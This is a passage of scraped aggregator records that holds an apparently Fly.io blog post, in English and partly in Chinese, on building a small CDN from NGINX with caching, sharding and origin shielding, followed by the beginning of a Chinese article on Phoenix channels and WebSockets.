\u670d\u52a1\u5668\u51e0\u4e4e\u603b\u662f\u6bd4\u539f\u59cb\u670d\u52a1\u66f4\u5feb\u3002\u4f46\u662f\uff0c\u5b9e\u9645\u4e0a\uff0c\u5b83\u5f88\u6162\u800c\u4e14\u4e0d\u53d7\u6b22\u8fce\u3002\u6fb3\u5927\u5229\u4e9a\u7684\u8bf7\u6c42\u53ef\u80fd\u4f1a\u5728\u524d\u5f80\u5f17\u5409\u5c3c\u4e9a\u7684\u9014\u4e2d\u7ecf\u8fc7\u65b0\u52a0\u5761\u3002\u751a\u81f3\u5149\u5728 14,624 \u516c\u91cc\uff08\u6fb3\u5927\u5229\u4e9a\u5230\u5f17\u5409\u5c3c\u4e9a\u5dde\uff09\u4e0a\u4e5f\u5f88\u6162\uff0c\u56e0\u6b64\u6fb3\u5927\u5229\u4e9a\u5230\u65b0\u52a0\u5761\uff084,300 \u516c\u91cc\uff09\u7684\u7f13\u5b58\u51cf\u5c11\u4e86\u53ef\u5bdf\u89c9\u7684\u5ef6\u8fdf\u3002\u7f13\u5b58\u672a\u547d\u4e2d\u65f6\u4f1a\u6162\u4e00\u70b9\u3002\u4f46\u6211\u4eec\u8c08\u8bba\u7684\u662f\u201c\u4ee4\u4eba\u8ba8\u538c\u7684\u6162\u201d\u548c\u201c\u6bd4\u4ee4\u4eba\u8ba8\u538c\u7684\u6162\u8fd8\u7cdf\u7cd5 150 \u6beb\u79d2\u201d\u4e4b\u95f4\u7684\u533a\u522b\u3002\u5982\u679c\u60a8\u6b63\u5728\u6784\u5efa\u901a\u7528 CDN\uff0c\u8fd9\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u65b9\u6cd5\u3002\u60a8\u53ef\u4ee5\u521b\u5efa\u4e00\u4e9b\u8d85\u7ea7\u533a\u57df\uff0c\u4e3a\u4e16\u754c\u7684\u4e00\u90e8\u5206\u805a\u5408\u7f13\u5b58\u6570\u636e\u3002\n\u5982\u679c\u60a8\u4e0d\u662f\u5728\u6784\u5efa\u901a\u7528 CDN\uff0c\u800c\u53ea\u662f\u60f3\u52a0\u901f\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u90a3\u4e48\u8fd9\u662f\u4e00\u4e2a\u8106\u5f31\u7684\u89e3\u51b3\u65b9\u6848\u3002\u60a8\u6700\u597d\u5c06\u5e94\u7528\u7a0b\u5e8f\u7684\u4e00\u90e8\u5206\u5206\u53d1\u5230\u591a\u4e2a\u533a\u57df\u3002 CDN \u7684\u57fa\u672c\u601d\u60f3\u662f\u9648\u65e7\u7684\uff0c\u5e76\u4e14\u6613\u4e8e\u7406\u89e3\u3002\u4f46\u662f\uff0c\u6784\u5efa CDN \u5386\u6765\u662f\u4e00\u9879\u96c4\u5fc3\u52c3\u52c3\u7684\u56e2\u961f\u4e8b\u4e1a\uff0c\u800c\u4e0d\u662f\u5355\u4e2a\u5f00\u53d1\u4eba\u5458\u7684\u5468\u672b\u9879\u76ee\u3002\u4f46\u662f\uff0c\u529f\u80fd\u5f3a\u5927\u7684 CDN \u7684\u6784\u5efa\u5757\u5df2\u7ecf\u5728 NGINX \u7b49\u5de5\u5177\u4e2d\u4f7f\u7528\u4e86\u5f88\u957f\u65f6\u95f4\u3002\u5982\u679c\u4f60\u4e00\u76f4\u5728\u5bb6\u91cc\u73a9 Github \u5b58\u50a8\u5e93\uff0c\u6211\u4eec\u5e0c\u671b\u4f60\u5df2\u7ecf\u6ce8\u610f\u5230\uff0c\u5373\u4f7f\u662f\u6211\u4eec\u6b63\u5728\u8c08\u8bba\u7684\u6700\u590d\u6742\u7684\u8bbe\u8ba1\u8fed\u4ee3\uff0c\u4e00\u4e2a\u5177\u6709\u6bcf\u4e2a\u533a\u57df\u5197\u4f59\u7684\u8bbe\u8ba1\uff0c\u5e76\u5141\u8bb8\u5bf9\u533a\u57df\u4e4b\u95f4\u7684\u8bf7\u6c42\u8def\u7531\uff0c\u5927\u591a\u53ea\u662f NGINX \u914d\u7f6e --- \u800c\u4e0d\u662f\u7279\u522b\u590d\u6742\u7684\u914d\u7f6e\u3002\u6211\u4eec\u6dfb\u52a0\u7684\u201c\u4ee3\u7801\u201d\u53ea\u662f\u8db3\u4ee5\u63d2\u5165\u5730\u5740\u7684 bash\u3002\u6240\u4ee5\u8fd9\u662f\u4e00\u4e2aCDN\u3002\u5b83\u975e\u5e38\u9002\u5408\u7b80\u5355\u7684\u7f13\u5b58\u3002\u5bf9\u4e8e\u590d\u6742\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5b83\u53ea\u7f3a\u5c11\u4e00\u4e9b\u4e1c\u897f\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u6839\u672c\u6ca1\u6709\u89e3\u51b3\u7f13\u5b58\u8fc7\u671f\u95ee\u9898\u3002\u4f7f\u7528 CDN \u7684\u4e00\u4e2a\u94c1\u5b9a\u89c4\u5219\u662f\uff1a\u60a8\u7edd\u5bf9\u4f1a\u5728\u53d1\u5e03\u7248\u672c\u4e0a\u8f93\u5165\u4e00\u4e2a\u4ee4\u4eba\u5c34\u5c2c\u7684\u62fc\u5199\u9519\u8bef\uff0c\u53d1\u73b0\u4e3a\u65f6\u5df2\u665a\uff0c\u5e76\u4e14\u53d1\u73b0\u60a8\u6240\u6709\u7684\u7f13\u5b58\u670d\u52a1\u5668\u90fd\u6709\u4e00\u4e2a\u540d\u4e3a\u201cA Better Amercia\u201d\u7684\u526f\u672c\u3002\u5206\u5e03\u5f0f\u7f13\u5b58\u5931\u6548\u5bf9\u4e8e CDN \u6765\u8bf4\u662f\u4e00\u4e2a\u5927\u800c\u68d8\u624b\u7684\u95ee\u9898\u3002\u6709\u4eba\u53ef\u4ee5\u5199\u4e00\u6574\u7bc7\u5173\u4e8e\u5b83\u7684\u6587\u7ae0\u3002 CDN \u5c42\u4e5f\u662f\u6dfb\u52a0\u5e94\u7528\u7a0b\u5e8f\u529f\u80fd\u7684\u7edd\u4f73\u573a\u6240\u3002\u56fe\u50cf\u4f18\u5316\u3001WAF\u3001API \u901f\u7387\u9650\u5236\u3001\u673a\u5668\u4eba\u68c0\u6d4b\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u3002\u6709\u4eba\u53ef\u4ee5\u628a\u8fd9\u4e9b\u53d8\u6210\u5341\u591a\u7bc7\u6587\u7ae0\u3002\u6700\u540e\u4e00\u4ef6\u4e8b\u3002\u5c31\u50cf\u6211\u4eec\u4e4b\u524d\u63d0\u5230\u7684\uff1a\u6574\u7bc7\u6587\u7ae0\u90fd\u662f\u504f\u89c1\u3002\u6211\u4eec\u5f3a\u8c03\u8fd9\u4e2a CDN \u8bbe\u8ba1\u662f\u56e0\u4e3a\u6211\u4eec\u6784\u5efa\u4e86\u4e00\u4e2a\u5e73\u53f0\uff0c\u5b83\u53ef\u4ee5\u975e\u5e38\u5bb9\u6613\u5730\u8868\u8fbe\uff08\u4f60\u5e94\u8be5\u73a9\u5b83\uff09\u3002\u90a3\u4e9b\u4f7f\u6784\u5efa CDN on Fly \u53d8\u5f97\u5fae\u4e0d\u8db3\u9053\u7684\u76f8\u540c\u5e73\u53f0\u529f\u80fd\u4e5f\u4f7f\u5206\u53d1\u6574\u4e2a\u5e94\u7528\u7a0b\u5e8f\u53d8\u5f97\u5bb9\u6613\uff1b\u4e3a\u8fb9\u7f18\u5206\u53d1\u8bbe\u8ba1\u7684\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u6839\u672c\u4e0d\u9700\u8981 CDN\u3002\n\u5728 Twitter \u4e0a\u5206\u4eab\u8fd9\u7bc7\u6587\u7ae0 \u5728 Hacker News \u4e0a\u5206\u4eab\u8fd9\u7bc7\u6587\u7ae0 \u5728 Reddit \u4e0a\u5206\u4eab\u8fd9\u7bc7\u6587\u7ae0", "note_en": "The term &#34;CDN&#34; (&#34;content delivery network&#34;) conjures Google-scale companies managing huge racks of hardware, wrangling hundreds of gigabits per second. But CDNs are just web applications. That&#39;s not how we tend to think of them, but that&#39;s all they are. You can build a functional CDN on an 8-year-old laptop while you&#39;re sitting at a coffee shop. I&#39;m going to talk about  what you might come up with if you spend the next five hours building a CDN.\n  It&#39;s useful to define exactly what a CDN does. A CDN hoovers up files from a central repository (called an  origin) and stores copies close to users. Back in the dark ages, the origin was a CDN&#39;s FTP server. These days, origins are just web apps and the CDN functions as a proxy server. So that&#39;s what we&#39;re building: a distributed caching proxy.\n   HTTP defines a whole infrastructure of  intricate and fussy caching features. It&#39;s all very intimidating and complex. So we&#39;re going to resist the urge to build from scratch and use the work other people have done for us.\n  We have choices. We could use  Varnish (scripting! edge side includes! PHK blog posts!). We could use  Apache Traffic Server (being the only new team this year to use ATS!). Or we could use  NGINX (we&#39;re already running it!). The only certainty is that you&#39;ll come to hate whichever one you pick. Try them all and pick the one you hate the least.\n    What we&#39;re talking about building is not basic. But it&#39;s not so bad. All we have to do is take our antique Rails setup and run it in multiple cities. If we can figure out how to get people in Australia to our server in Sydney and people in Chile to our server in Santiago, we&#39;ll have something we could reasonably call a CDN.\n     Anycast: acquire routable address blocks, advertise them in multiple places with BGP4, and then pretend that you have opinions about &#34;communities&#34; and &#34;route reflectors&#34; on Twitter. Let the Internet do the routing for you. Downside: it&#39;s harder to do, and the Internet is sometimes garbage. Upside: you might become insufferable.\n DNS: Run trick DNS servers that return specific server addresses based on IP geolocation. Downside: the Internet is moving away from geolocatable DNS source addresses. Upside: you can deploy it anywhere without help.\n Be like a game server: Ping a bunch of servers and use the best. Downside: gotta own the client. Upside: doesn&#39;t matter, because you don&#39;t own the client.\n  You&#39;re probably going to use a little of (1) and a little of (2). DNS load balancing is pretty simple. You don&#39;t really even have to build it yourself; you can host DNS on companies like DNSimple, and then define rules for returning addresses. Off you go!\n  Anycast is more difficult. We have more to say about this \u2014 but not here. In the meantime, you can use  us, and deploy an app with an Anycast address in about 2 minutes. This is bias. But also: true.\n  Boom, CDN. Put an NGINX in each of a bunch of cities, run DNS or Anycast for traffic direction, and you&#39;re 90% done. The remaining 10% will take you months.\n   The briny deeps are filled with undersea cables, crying out constantly to nearby ships:  &#34;drive through me&#34;! Land isn&#39;t much better, as the old networkers shanty goes: &#34;backhoe, backhoe, digging deep \u2014 make the backbone go to sleep&#34;. When you run a server in a single location, you don&#39;t so much notice this. Run two servers and you&#39;ll start to notice. Run servers around the world and you&#39;ll notice it to death.\n  What&#39;s cool is: running a single NGINX in multiple cities gives you a lot of ready-to-use redundancy. If one of them dies for some reason, there are bunch more to send traffic to. When one of your servers goes offline, the rest are still there serving most of your users.\n  It&#39;s tedious but straightforward to make this work. You have health checks (aside: when CDN regions break, they usually break by being slow, so you&#39;d hope your health checks catch that too). They tell you when your NGINX servers fail. You script DNS changes or withdraw BGP routes (perhaps just by stopping your BGP4 service on those regions) in response.\n  That&#39;s server failure, and it&#39;s easy to spot. Internet burps are harder to detect. You&#39;ll need to run external health checks, from multiple locations. It&#39;s easy to get basic, multi-perspective monitoring \u2013\u00a0we use  Datadog and  updown.io, and we&#39;re building out our own  half-built home grown service. You&#39;re not asking for much more than what  cURL will tell you. Again: the thing you&#39;re super wary about in a CDN is a region getting slow, not falling off the Internet completely.\n  Quick aside: notice that all those monitoring options work from someone else&#39;s data center to your data center. DC-DC traffic is a good start, enough for a lot of jobs. But it isn&#39;t representative. Your users aren&#39;t in data centers (I hope). When you&#39;re really popular, what you want is monitoring from the vantage point of actual clients. For this, you can find hundreds of companies selling RUM (real user monitoring), which usually takes the form of surreptitiously embedded Javascript bugs. There&#39;s one rum we like. It&#39;s sold by a company called Plantation and it&#39;s aged in wine casks. Drink a bunch of it, and then do your own instrumentation with  Honeycomb.\n  Ridiculous Internet problems are the worst. But the good news about them is, everyone is making up the solutions as they go along, so we don&#39;t have to talk about them so much. Caching is more interesting. So let&#39;s talk about onions.\n   The figure of merit in cache measurement is &#34;cache ratio&#34;. Cache ratio measures how often we&#39;re able to server from our cache, versus the origin.\n  A cache ratio of 80% just means &#34;when we get a request, we can serve it from cache 80% of the time, and the remaining 20% of the time we have to proxy the request to the origin&#34;. If you&#39;re building something that wants a CDN, high cache ratios are good, and low cache ratios are bad.\n  If you followed the link earlier in the post to the Github repository, you might&#39;ve noticed that our  na\u00efve NGINX setup is an isolated single server. Deploying it in twenty places gives us twenty individual servers. It&#39;s dead simple. But the simplicity has a cost \u2013 there&#39;s no per-region redundancy. All twenty servers will need to make requests to the origin. This is brittle, and cache ratios will suffer. We can do better.\n  The simple way to increase redundancy is to add a second server in each region. But doing that might wreck cache ratios. The single server has the benefit of hosting a single cache for all users; with two, you&#39;ve got twice the number of requests per origin, and twice the number of cache misses.\n  What you want to do is teach your servers to talk to each other, and make them ask their friends for cache content. The simplest way to do this is to create cache shards \u2013\u00a0split the data up so each server is responsible for a chunk of it, and everyone else routes requests to the cache shard that owns the right chunk.\n  That sounds complicated, but NGINX&#39;s built in load balancer supports hash based load balancing. It hashes requests, and forwards the &#34;same request&#34; to same server, assuming that server is available. If you&#39;re playing the home version of this blog post, here&#39;s a  ready to go example of an NGINX cluster that discovers its peers, hashes the URL, and serves requests through available servers.\n    When requests for  a.jpg hit our NGINX instances, they will all forward the request to the same server in the cluster. Same for  b.jpg. This setup has servers serve as both the load balancing proxy and the storage shard. You can separate these layers, and you might want to if you&#39;re building more advanced features into your CDN.\n  Our clustered NGINX example uses Fly-features we think are really cool.  Persistent volumes help keep cache ratios high between NGINX upgrades.  Encrypted private networking makes secure NGINX to NGINX communications simple and keeps you from having to do complicated  mTLS gymnastics. Built in DNS service discovery helps keep the clusters up to date when we add and remove servers. If it sounds a little too perfectly matched, it&#39;s because we built these features specifically for CDN-like-workloads.\n  But of course, you can do all this stuff anywhere, not just on Fly. But  it&#39;s easy on Fly.\n  Two truths: a high cache ratio is good, the Internet is bad. If you like killing birds and conserving stones, you&#39;ll really enjoy solving for cache ratios and garbage Internet. The answer to both of those problems involves getting the Internet&#39;s grubby hands off our HTTP requests. A simple way to increase cache ratios: bypass the out-of-control Internet and proxy origin requests through networks you trust to behave themselves.\n  CDNs typically have servers in regions close to their customers&#39; origins. If you put our NGINX example in Virginia, you suddenly have servers close to AWS&#39;s largest region. And you definitely have customers on AWS. That&#39;s the advantage of existing alongside a giant powerful monopoly!\n    You can, with a little NGINX and proxy magic, send  all requests through Virginia on their way to the origin servers. This is good. There are fewer Internet bear traps between your servers in Virginia and your customers&#39; servers in  us-east-1. And now you have a single, canonical set of servers to handle a specific customers&#39; requests.\n  Good news. This setup improves your cache ratio AND avoids bad Internet. For bonus points, it&#39;s also the foundation for extra CDN features.\n  If you&#39;ve ever gone CDN shopping, you&#39;ve come across things like &#34;Shielding&#34; and &#34;Request Coalescing&#34;. Origin shielding typically just means sending all traffic through a known data center. This can minimize traffic to origin servers, and  also, because you probably know the IPs your CDN regions use, you can control access with simple L4 firewall rules.\n   Coalescing requests also minimizes origin traffic, especially during big events when many users are trying to get at the same content. When 100,000 users request your  latest cleverly written blog post at once, and it&#39;s not yet cached, that  could end up meaning 100k concurrent requests to your origin. That&#39;s a face melting level of traffic for most origins. Solving this is a matter of &#34;locking&#34; a specific URL to ensure that if an NGINX server is making an origin request, the other clients pause until the cache is file. In our clustered NGINX example, this is a  two line configuration.\n   Proxying through a single region to increase cache ratios is a little bit of a cheat. The entire purpose of a CDN is to speed things up for users. Sending requests from Singapore to Virginia will make things  barely faster, because a set of NGINX servers with cached content is almost always faster than origin services. But, really, it&#39;s slow and undesirable.\n      Requests in Australia could run through Singapore on the way to Virginia. Even light is slow over 14,624 kilometers (Australia to Virginia), so Australia to Singapore (4,300 kilometers) with a cache cuts a perceptible amount of latency. It will be a little slower on cache misses. But we&#39;re talking about the difference between &#34;irritatingly slow&#34; and &#34;150ms worse than irritatingly slow&#34;.\n  If you are building a general purpose CDN, this is a nice way to do it. You can create a handful of super-regions that aggregate cache data for part of the world.\n  If you&#39;re not building a general purpose CDN, and are instead just trying to speed up your application, this is a brittle solution. You are  probably better off distributing portions of your application to multiple regions.\n   The basic ideas of a CDN are old, and easy to understand. But building out a CDN has historically been an ambitious team enterprise, not a weekend project for a single developer.\n  But the building blocks for a capable CDN have been in tools like NGINX for a long time. If you&#39;ve been  playing along at home with the Github repo, we hope you&#39;ve noticed that even the most complicated iteration of the design we&#39;re talking about, a design that has per-region redundancy and that allows for rudimentary control of request routing between regions, is mostly just NGINX configuration --- and not an especially complicated configuration. The &#34;code&#34; we&#39;ve added is just  bash sufficient to plug in addresses.\n  So that&#39;s a CDN. It&#39;ll work just great for simple caching. For complicated apps, it&#39;s only missing a few things.\n  Notably, we didn&#39;t address cache expiration  at all. One ironclad rule of using a CDN is: you will absolutely put an embarrassing typo on a launch release, notice it too late, and discover that all your cache servers have a copy titled &#34;A Better Amercia&#34;. Distributed cache invalidation is a big, hairy problem for a CDN. Someone could write a whole article about it.\n  The CDN layer is also an exceptionally good place to add app features. Image optimization, WAF, API rate limiting, bot detection, we could go on. Someone could turn these into ten more articles.\n  One last thing. Like we mentioned earlier: this whole article is bias. We&#39;re highlighting this CDN design because we built a platform that makes it very easy to express (you should play with it). Those same platform features that make it trivial to build a CDN on Fly also make it easy to distribute your whole application; an application designed for edge distribution may not need a CDN at all.\n      Share this post on Twitter             Share this post on Hacker News             Share this post on Reddit", "posttime": "2021-08-05 20:57:00", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u5c0f\u65f6,hour,\u670d\u52a1\u5668", "title": "5 \u5c0f\u65f6 CDN", "title_en": "The 5-Hour CDN", "transed": 1, "url": "https://fly.io/blog/the-5-hour-content-delivery-network/", "via": "", "real_tags": ["\u5c0f\u65f6", "hour", "\u670d\u52a1\u5668"]}, {"category": "", "categoryclass": "", "imagename": "fb23553c336f4318c8fba85844339e63.jpg", "infoid": 1071342, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "Chris McCord \u5c55\u793a\u4e86\u5355\u4e2a Phoenix \u670d\u52a1\u5668\u5982\u4f55\u652f\u6301\u4e00\u767e\u4e07\u4e2a\u8fde\u63a5\u3002\u8fd9\u610f\u5473\u7740\u4e00\u767e\u4e07\u4eba\u5728\u4ec5\u7531\u5355\u4e2a\u7269\u7406\u670d\u52a1\u5668\u63d0\u4f9b\u652f\u6301\u7684\u804a\u5929\u5e94\u7528\u7a0b\u5e8f\u4e2d\u53d1\u9001\u548c\u63a5\u6536\u6d88\u606f\u3002\u60a8\u53ef\u80fd\u66f4\u719f\u6089\u5178\u578b\u7684\u5355\u5411\u670d\u52a1\u5668\u8bf7\u6c42\u3002\u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u8bf7\u6c42\u4fe1\u606f\uff0c\u670d\u52a1\u5668\u54cd\u5e94\u3002 Websockets \u5141\u8bb8\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u76f4\u63a5\u53cc\u5411\u901a\u4fe1\u3002\u56e0\u6b64\uff0c\u5bf9\u4e8e\u5927\u591a\u6570\u5b9e\u65f6\u5e94\u7528\u7a0b\u5e8f\uff0cWebSockets \u66f4\u53ef\u53d6\u3002\u5728\u4efb\u4f55\u65f6\u5019\uff0c\u5ba2\u6237\u7aef\u6216\u670d\u52a1\u5668\u90fd\u53ef\u4ee5\u5411\u5bf9\u65b9\u53d1\u9001\u6d88\u606f\u3002 Websockets \u662f Phoenix \u4e2d\u9ed8\u8ba4\u7684\u5b9e\u65f6\u901a\u4fe1\u65b9\u5f0f\u3002\u957f\u8f6e\u8be2\u662f\u53e6\u4e00\u79cd\u4e0d\u592a\u6d41\u884c\u7684\u5b9e\u65f6\u529f\u80fd\u901a\u4fe1\u534f\u8bae\uff0c\u901a\u5e38\u5728\u5ba2\u6237\u7aef\u4e92\u8054\u7f51\u8fde\u63a5\u4e0d\u4f73\u65f6\u4f7f\u7528\u3002\u957f\u8f6e\u8be2\u662f\u8bf7\u6c42\u548c\u54cd\u5e94\u7684\u8fde\u7eed\u5faa\u73af\uff0c\u800c\u4e0d\u662f\u5f00\u653e\u7684\u53cc\u5411\u901a\u4fe1\u3002\u5ba2\u6237\u7aef\u5efa\u7acb\u8fde\u63a5\u3002\u7136\u540e\u8fde\u63a5\u4fdd\u6301\u6253\u5f00\u72b6\u6001\uff0c\u76f4\u5230\u670d\u52a1\u5668\u8d85\u65f6\u6216\u54cd\u5e94\u3002\u7136\u540e\u5ba2\u6237\u7aef\u91cd\u65b0\u5efa\u7acb\u8fde\u63a5\uff0c\u5faa\u73af\u7ee7\u7eed\u3002\u8fd9\u5141\u8bb8\u670d\u52a1\u5668\u63a7\u5236\u4f55\u65f6\u66f4\u65b0\u5ba2\u6237\u7aef\u5e76\u4f7f\u4e92\u8054\u7f51\u8fde\u63a5\u4e0d\u4f73\u7684\u5ba2\u6237\u7aef\u53d7\u76ca\u3002\n\u201c\u5982\u679c\u51fa\u73b0\u95ee\u9898\uff0c\u4f8b\u5982\u7f51\u7edc\u8fde\u63a5\u4e0d\u826f\uff0c\u5ba2\u6237\u7aef\u53ef\u4ee5\u4ece WebSocket \u66f4\u6539\u4e3a\u957f\u8f6e\u8be2\u3002\u201d - Pragmatic Programmer Channels \u662f Phoenix \u7684\u4e00\u4e2a\u4ee4\u4eba\u5174\u594b\u7684\u90e8\u5206\uff0c\u5b83\u652f\u6301\u4e0e\u6570\u767e\u4e07\u4e2a\u8fde\u63a5\u7684\u5ba2\u6237\u7aef\u4ee5\u53ca\u5b83\u4eec\u4e4b\u95f4\u7684\u8f6f\u5b9e\u65f6\u901a\u4fe1\u3002\u8bf8\u5982\u201c\u8fdb\u7403\u5f97\u5206\u201d\u6216\u201c\u5730\u9707\u5373\u5c06\u6765\u4e34\u201d\u4e4b\u7c7b\u7684\u7a81\u53d1\u65b0\u95fb\uff0c\u51e4\u51f0\u9891\u9053\u5141\u8bb8\u5728\u8bb8\u591a\u5ba2\u6237\u4e4b\u95f4\u8fdb\u884c\u5b9e\u65f6\u529f\u80fd\u3002\u8fd9\u5c31\u662f\u5b9e\u8df5\u4e2d\u7684\u6837\u5b50\u3002 Phoenix \u63d0\u4f9b\u4e86\u60a8\u5f00\u59cb\u4f7f\u7528\u5b9e\u65f6\u529f\u80fd\u6240\u9700\u7684\u4e00\u5207\u3002\u9700\u8981\u4e86\u89e3\u7684\u91cd\u8981\u90e8\u5206\u662f\u7aef\u70b9\u3001\u5957\u63a5\u5b57\u3001\u4e3b\u9898\u548c\u901a\u9053\u3002\u7aef\u70b9\u662f\u5bf9\u60a8\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u6240\u6709\u8bf7\u6c42\u5f00\u59cb\u7684\u8fb9\u754c\u3002\u5b83\u4e5f\u662f\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u7ed9\u5e95\u5c42 Web \u670d\u52a1\u5668\u7684\u63a5\u53e3\u3002\u63d0\u4f9b\u7528\u4e8e\u542f\u52a8\u548c\u505c\u6b62\u7aef\u70b9\u7684\u5305\u88c5\u5668\u4f5c\u4e3a\u76d1\u7763\u6811\u7684\u4e00\u90e8\u5206\n\u5728\u60a8\u7684 Phoenix \u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684 endpoint.ex \u6587\u4ef6\u4e2d\uff0c\u60a8\u4f1a\u6ce8\u610f\u5230 Endpoint \u9ed8\u8ba4\u8bbe\u7f6e\u4e86\u7528\u6237\u5957\u63a5\u5b57\u3002\u5b83\u8fd8\u8bbe\u7f6e\u4e86\u4e00\u4e2a LiveView \u5957\u63a5\u5b57\uff0c\u4f46\u6211\u4eec\u5c06\u91cd\u70b9\u5173\u6ce8\u7528\u6237\u5957\u63a5\u5b57\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cPhoenix \u4f7f\u7528 WebSockets \u800c\u4e0d\u662f\u957f\u8f6e\u8be2\uff0c\u4f46\u5b83\u540c\u65f6\u652f\u6301\u4e24\u8005\u3002\u6ce8\u610f socket \u65b9\u6cd5\u4e2d\u7684 websockets: true \u548c longpolling: false \u3002\u5957\u63a5\u5b57\u5fc5\u987b\u5b9a\u4e49\u4e24\u4e2a\u56de\u8c03\uff0cconnect \u548c id\u3002\u8fd9\u4e9b\u56de\u8c03\u7528\u4e8e\u9a8c\u8bc1\u548c\u8bc6\u522b\u5957\u63a5\u5b57\u8fde\u63a5\u3002\u5957\u63a5\u5b57\u7ba1\u7406\u60a8\u7684 Phoenix \u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u4e0d\u540c\u901a\u9053\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528 Phoenix.Socket \u6a21\u5757\u63d0\u4f9b\u7684\u5185\u7f6e\u901a\u9053\u65b9\u6cd5\u8fde\u63a5\u7279\u5b9a\u4e0a\u4e0b\u6587\u4e0b\u7684\u901a\u9053\u3002 channel \u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u503c\uff0c\u6d88\u606f\u7684\u4e0a\u4e0b\u6587\u548c\u5728\u8be5\u4e0a\u4e0b\u6587\u4e0b\u5904\u7406\u6d88\u606f\u7684 Channel \u6a21\u5757\u3002\u4f8b\u5982\uff0c\u8fd9\u91cc\u662f\u5982\u4f55\u5c06\u804a\u5929\u4e0a\u4e0b\u6587\u4e0b\u7684\u6240\u6709\u6d88\u606f\u8fde\u63a5\u5230 ChatChannel\u3002\u661f\u53f7 * \u662f\u901a\u914d\u7b26\u3002\u8fd9\u610f\u5473\u7740 ChatChannel \u5904\u7406\u804a\u5929\u4e3b\u9898\u4e0b\u7684\u6240\u6709\u4e8b\u4ef6\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u751f\u6210\u7684\u9891\u9053\u5305\u542b\u4e00\u4e2a join \u65b9\u6cd5\uff0c\u7528\u4e8e\u5904\u7406\u5c06\u5ba2\u6237\u7aef\u8fde\u63a5\u5230\u9891\u9053\u3002\u8fd9\u79cd\u52a0\u5165\u65b9\u6cd5\u4f7f\u7528\u4e86\u6388\u6743\uff1f\u65b9\u6cd5\u4f5c\u4e3a\u60a8\u5c06\u6765\u53ef\u80fd\u60f3\u8981\u5b9e\u73b0\u7684\u4efb\u4f55\u6388\u6743\u903b\u8f91\u7684\u5360\u4f4d\u7b26\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6240\u6709\u52a0\u5165\u8bf7\u6c42\u90fd\u88ab\u6388\u6743\u3002\u901a\u9053\u4f7f\u7528 handle_in \u65b9\u6cd5\u6765\u5904\u7406\u4ece\u5ba2\u6237\u7aef\u63a5\u6536\u6d88\u606f\u3002 handle_in \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8981\u8fdb\u884c\u6a21\u5f0f\u5339\u914d\u7684\u4e8b\u4ef6\u540d\u79f0\u5b57\u7b26\u4e32\u3002\u5ba2\u6237\u7aef\u53d1\u9001\u76f8\u540c\u7684\u4e8b\u4ef6\u540d\u79f0\u5b57\u7b26\u4e32\uff0c\u4ee5\u4fbf\u901a\u9053\u77e5\u9053\u54ea\u4e2a handle_in \u65b9\u6cd5\u5e94\u8be5\u5904\u7406\u4f20\u5165\u7684\u6d88\u606f\u3002\nPhoenix \u63d0\u4f9b\u4e86\u4e00\u4e2a socket.js \u6587\u4ef6\u6765\u5904\u7406\u4ece\u5ba2\u6237\u7aef\u5230\u670d\u52a1\u5668\u7684\u8fde\u63a5\u3002\u5728\u90a3\u91cc\u4f60\u4f1a\u53d1\u73b0\u4e00\u4e9b\u6837\u677f\u4ee3\u7801\u6765\u5904\u7406\u8fde\u63a5\u5230\u4e00\u4e2a\u9891\u9053\u3002\u66f4\u6539\u8be5\u4ee3\u7801\u4ee5\u5339\u914d\u60a8\u7684\u4e3b\u9898\u548c\u526f\u4e3b\u9898\u3002\u8fd9\u5e94\u8be5\u4e0e\u60a8\u7528\u4e8e\u9891\u9053\u52a0\u5165\u65b9\u6cd5\u7684\u5b57\u7b26\u4e32\u76f8\u5339\u914d\u3002\u4f7f\u7528 mix phx.server \u542f\u52a8\u60a8\u7684 phoenix \u9879\u76ee\u5e76\u6253\u5f00\u60a8\u7684\u6d4f\u89c8\u5668\u63a7\u5236\u53f0\uff08\u901a\u5e38\u4e3a f12\uff09\uff0c\u60a8\u5c06\u770b\u5230\u60a8\u5df2\u6210\u529f\u52a0\u5165\u3002\u5982\u679c\u5c06\u8fd9\u4e24\u79cd\u65b9\u6cd5\u90fd\u6dfb\u52a0\u5230 socket.js \u6587\u4ef6\u4e2d\uff0c\u5219\u6548\u679c\u5982\u4e0b\u6240\u793a\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528\u51e4\u51f0\u9891\u9053\u4e2d\u7684 handle_out \u65b9\u6cd5\u62e6\u622a\u6d88\u606f\u3002\u60a8\u53ef\u4ee5\u8986\u76d6\u503c\u3001\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u6216\u6dfb\u52a0\u5176\u4ed6\u4fe1\u606f\u3002\u6bcf\u5f53 handle_in \u65b9\u6cd5\u4f7f\u7528\u76f8\u540c\u7684\u4e8b\u4ef6\u5b57\u7b26\u4e32\u8c03\u7528\u5e7f\u64ad\u65b9\u6cd5\u65f6\uff0c\u5c31\u4f1a\u89e6\u53d1 handle_out \u65b9\u6cd5\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u201c\u558a\u201d\u3002\u60a8\u8fd8\u5fc5\u987b\u5728 Phoenix 